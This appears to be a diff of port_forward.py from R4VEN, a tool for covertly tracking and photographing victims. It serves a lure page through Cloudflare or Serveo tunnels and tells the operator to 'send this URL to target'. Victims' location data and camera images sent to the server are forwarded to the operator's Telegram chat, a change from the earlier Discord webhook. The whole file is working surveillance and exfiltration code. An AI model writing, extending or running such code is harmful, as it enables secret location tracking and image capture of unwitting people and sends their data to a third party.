@@ -1,3 +1,5 @@
+#!/usr/bin/env python3
+# port_forward.py
 import sys
 import requests
 import os
@@ -5,31 +7,34 @@ import socket
 import subprocess
 import threading
 import logging
-import requests
 import argparse
-import re
 import time
+import signal
 from flaredantic import FlareTunnel, FlareConfig
 from flask import Flask, request, Response, send_from_directory
-import signal
-from utils import get_file_data, update_webhook, check_and_get_webhook_url
+from utils import get_file_data, update_webhook, check_and_get_webhook_url, send_telegram_message
 
-# Global flag to handle graceful shutdown
-shutdown_flag = threading.Event()
+# ==============================================
+# CONFIG LOGGING
+# ==============================================
+logging.basicConfig(filename='r4ven.log', level=logging.DEBUG,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
 
-HTML_FILE_NAME = "index.html"
-
+# ==============================================
+# COLOR SETUP
+# ==============================================
 if sys.stdout.isatty():
-    R = '\033[31m'  # Red
-    G = '\033[32m'  # Green
-    C = '\033[36m'  # Cyan
-    W = '\033[0m'   # Reset
-    Y = '\033[33m'  # Yellow
-    M = '\033[35m'  # Magenta
-    B = '\033[34m'  # Blue
+    R = '\033[31m'; G = '\033[32m'; C = '\033[36m'
+    W = '\033[0m';  Y = '\033[33m'; M = '\033[35m'; B = '\033[34m'
 else:
     R = G = C = W = Y = M = B = ''
 
+# ==============================================
+# GLOBAL VARIABLES
+# ==============================================
+HTML_FILE_NAME = "index.html"
+DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
+shutdown_flag = threading.Event()
 app = Flask(__name__)
 
 parser = argparse.ArgumentParser(
@@ -40,64 +45,71 @@ parser.add_argument("-t", "--target", nargs="?", help="the target url to send th
 parser.add_argument("-p", "--port", nargs="?", help="port to listen on", type=int, default=8000)
 args = parser.parse_args()
 
-def should_exclude_line(line):
-    # Add patterns of lines you want to exclude
-    exclude_patterns = [
-        "HTTP request"
-    ]
-    return any(pattern in line for pattern in exclude_patterns)
-
+# ==============================================
+# FLASK ROUTES
+# ==============================================
 @app.route("/", methods=["GET"])
 def get_website():
-    html_data = ""
     try:
         html_data = get_file_data(HTML_FILE_NAME)
     except FileNotFoundError:
-        pass
+        html_data = "<h1>File not found</h1>"
     return Response(html_data, content_type="text/html")
 
 @app.route("/dwebhook.js", methods=["GET"])
 def get_webhook_js():
-    return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)
+    if os.path.exists(DISCORD_WEBHOOK_FILE_NAME):
+        return send_from_directory(directory=os.getcwd(), path=DISCORD_WEBHOOK_FILE_NAME)
+    return Response("// webhook file not found", content_type="application/javascript")
 
 @app.route("/location_update", methods=["POST"])
 def update_location():
     data = request.json
-    discord_webhook = check_and_get_webhook_url(os.getcwd())
-    update_webhook(discord_webhook, data)
+    telegram = check_and_get_webhook_url(os.getcwd())
+    update_webhook(telegram, data)
     return "OK"
 
 @app.route('/image', methods=['POST'])
 def image():
-    i = request.files['image']
-    f = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
-    i.save('%s/%s' % (os.getcwd(), f))
-    #print(f"{B}[+] {C}Picture of the target captured and saved")
+    img = request.files['image']
+    filename = f"{time.strftime('%Y%m%d-%H%M%S')}.jpeg"
+    img.save(filename)
+    print(f"{G}[+] {C}Captured image saved: {filename}{W}")
 
-    webhook_url = check_and_get_webhook_url(os.getcwd())
-    files = {'image': open(f'{os.getcwd()}/{f}', 'rb')}
-    response = requests.post(webhook_url, files=files)
-
-    return Response("%s saved and sent to Discord webhook" % f)
+    telegram = check_and_get_webhook_url(os.getcwd())
+    try:
+        from utils import send_telegram_photo
+        send_telegram_photo(telegram["token"], telegram["chat_id"], filename,
+                            caption="📸 Target photo captured by R4VEN 🔥")
+    except Exception as e:
+        logging.error("Failed to send photo to Telegram: %s", e)
+        print(f"{R}[!] Failed to send photo to Telegram: {e}{W}")
+    return Response(f"{filename} saved and sent to Telegram")
 
 @app.route('/get_target', methods=['GET'])
 def get_url():
     return args.target
 
-#run_flask function to handle threading
+# ==============================================
+# CORE FUNCTIONS
+# ==============================================
+def should_exclude_line(line):
+    exclude_patterns = ["HTTP request"]
+    return any(pattern in line for pattern in exclude_patterns)
+
+# Flask runner
 def run_flask(folder_name):
     try:
         os.chdir(folder_name)
     except FileNotFoundError:
-        print(f"{R}Error: Folder '{folder_name}' does not exist.{W}")
+        print(f"{R}Error: Folder '{folder_name}' not found.{W}")
         sys.exit(1)
 
-    # Start Flask in a separate thread
-    flask_thread = threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
+    flask_thread = threading.Thread(target=app.run,
+                                    kwargs={"host": "0.0.0.0", "port": args.port, "debug": False})
     flask_thread.daemon = True
     flask_thread.start()
 
-    # Keep the main thread running to monitor the shutdown flag
     try:
         while not shutdown_flag.is_set():
             time.sleep(0.5)
@@ -105,71 +117,87 @@ def run_flask(folder_name):
         print(f"{R}Flask server terminated.{W}")
         shutdown_flag.set()
 
+# ==============================================
+# SIGNAL HANDLER
+# ==============================================
 def signal_handler(sig, frame):
-    """Handles termination signals like CTRL+C."""
-    print(f"{R}Exiting...{W}")
-    shutdown_flag.set()  # Set the shutdown flag to terminate threads
+    print(f"{R}\n[!] Exiting...{W}")
+    shutdown_flag.set()
     sys.exit(0)
 
-# Attach signal handler for CTRL+C
 signal.signal(signal.SIGINT, signal_handler)
 
-# Cloudflare tunnel with non-blocking handling
+# ==============================================
+# CLOUDFLARE TUNNEL
+# ==============================================
 def run_tunnel():
     try:
-        config = FlareConfig(
-            port=args.port,
-            verbose=True  # Enable logging for debugging
-        )
+        config = FlareConfig(port=args.port, verbose=True)
         with FlareTunnel(config) as tunnel:
-            print(f"{G}[+] Flask app available at: {C}{tunnel.tunnel_url}{W}")
-            
-            # Keep the main thread running to monitor the shutdown flag
+            tunnel_url = tunnel.tunnel_url
+            print(f"\n{G}[+] Flask app public URL: {C}{tunnel_url}{W}")
+
+            telegram = check_and_get_webhook_url(os.getcwd())
+            msg = f"🌐 Cloudflare tunnel started!\n\n🔗 <b>{tunnel_url}</b>\n\n👾 by trhacknon 🕶️"
+            send_telegram_message(telegram["token"], telegram["chat_id"], msg)
+
             while not shutdown_flag.is_set():
                 time.sleep(0.5)
     except Exception as e:
-        logging.error(f"Error in Cloudflare tunnel: {e}")
-        print(f"{R}Error: {e}{W}")
+        logging.error("Error in Cloudflare tunnel: %s", e)
+        print(f"{R}[!] Cloudflare tunnel error: {e}{W}")
 
-# Serveo
+# ==============================================
+# SERVEO PORT FORWARDING
+# ==============================================
 def start_port_forwarding():
     try:
-        command = ["ssh", "-R", f"80:localhost:{args.port}", "serveo.net"]
-        logging.info("Starting port forwarding with command: %s", " ".join(command))
-        
+        command = ["ssh", "-o", "StrictHostKeyChecking=no", "-R", f"80:localhost:{args.port}", "serveo.net"]
+        logging.info("Starting Serveo with command: %s", " ".join(command))
+
         process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        
         url_printed = False
+
+        telegram = check_and_get_webhook_url(os.getcwd())
+
         for line in process.stdout:
             line = line.strip()
-            if line:
-                if "Forwarding HTTP traffic from" in line and not url_printed:
-                    url = line.split(' ')[-1]
-                    formatted_url_message = (
-                        f"\n{M}[+] {C}Send This URL To Target: {G}{url}{W}\n {R}Don't close this window!{W}")
-                    print(formatted_url_message)
-                    logging.info(formatted_url_message)
-                    url_printed = True
-                elif not should_exclude_line(line):
-                    logging.info(line)
-                    print(line)
-        
+            if not line:
+                continue
+
+            if "Forwarding HTTP traffic from" in line and not url_printed:
+                url = line.split(" ")[-1]
+                msg = (
+                    f"\n{M}[+] {C}Send this URL to target: {G}{url}{W}\n"
+                    f"{R}Do not close this window!{W}\n"
+                )
+                print(msg)
+                send_telegram_message(
+                    telegram["token"], telegram["chat_id"],
+                    f"🚀 Serveo tunnel ready!\n\n🔗 <b>{url}</b>\n\n👾 by trhacknon 🕶️"
+                )
+                url_printed = True
+            elif not should_exclude_line(line):
+                print(line)
+
         for line in process.stderr:
             line = line.strip()
-            if line:
-                if not should_exclude_line(line):
-                    logging.error(line)
-                    print(line)
+            if line and not should_exclude_line(line):
+                logging.error(line)
+                print(line)
 
     except Exception as e:
-        print(f"An error occurred while using Serveo: {e}", "error")
+        logging.exception("Serveo error")
+        print(f"{R}[!] Serveo error: {e}{W}")
 
-# Function to check if Serveo is up
+# ==============================================
+# CHECK SERVEO STATUS
+# ==============================================
 def is_serveo_up():
-    print(f"\n{B}[?] {C}Checking if {Y}Serveo.net{W} is up for port forwarding...{W}", end="", flush=True)
+    print(f"\n{B}[?] {C}Checking Serveo.net availability...{W}", end="", flush=True)
     try:
-        response = requests.get("https://serveo.net", timeout=3)
-        if response.status_code == 200:
+        resp = requests.get("https://serveo.net", timeout=3)
+        if resp.status_code == 200:
             print(f" {G}[UP]{W}")
             return True
     except requests.RequestException:
@@ -177,26 +205,24 @@ def is_serveo_up():
     print(f" {R}[DOWN]{W}")
     return False
 
-# User choice
+# ==============================================
+# USER PROMPT
+# ==============================================
 def ask_port_forwarding():
-    serveo_status = "Site is Up" if is_serveo_up() else "Down! Currently not working"
-    print(f'____________________________________________________________________________\n')
-    print(f"{B}[~] {C}Choose port forwarding?{W}\n")
-    print(f"{Y}1. {W}serveo ({R}{serveo_status}{W})")
-    print(f"{Y}2. {W}cloudflare {G}(recommended)")
-    print(f"{Y}3. {W}None, I will use another method")
-    print(f"\n{M}Note:{R} If 1,2 does not work..{W}Use option {G}3{W} and port forward manually using tool like Ngrok\n")
-    choice = input(f"\n{B}[+] {Y}Enter the number corresponding to your choice: {W}")
-    return choice
+    serveo_status = "Up" if is_serveo_up() else "Down"
+    print(f"\n{'_' * 70}")
+    print(f"{B}[~] {C}Choose port forwarding method:{W}")
+    print(f"{Y}1.{W} Serveo ({G}{serveo_status}{W})")
+    print(f"{Y}2.{W} Cloudflare {G}(recommended){W}")
+    print(f"{Y}3.{W} None (manual / Ngrok etc.)")
+    print(f"\n{M}Note:{R} If 1 or 2 fails, use option 3 and port-forward manually.{W}")
+    return input(f"\n{B}[+] {Y}Your choice: {W}")
 
-#print(f"\n{B}[?] {C}Checking if {port} is available...{W}", end="", flush=True)
-
-# Port check
+# ==============================================
+# PORT AVAILABILITY CHECK
+# ==============================================
 def is_port_available(port):
-    """
-    Check if a port is available.
-    """
-    print(f"{B}[?] {C}Checking if port {Y}{port}{W} is available...{W}", end="", flush=True)
+    print(f"{B}[?] {C}Checking if port {Y}{port}{C} is available...{W}", end="", flush=True)
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
         if sock.connect_ex(("127.0.0.1", port)) != 0:
             print(f" {G}[AVAILABLE]{W}")
